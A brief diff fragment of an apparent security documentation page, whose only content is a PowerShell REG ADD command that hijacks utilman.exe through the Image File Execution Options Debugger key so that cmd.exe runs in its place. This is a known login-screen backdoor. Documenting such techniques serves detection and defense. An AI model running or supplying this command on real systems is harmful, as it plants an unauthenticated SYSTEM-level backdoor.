@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:23.626777+00:00'
 ```powershell
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
+
+
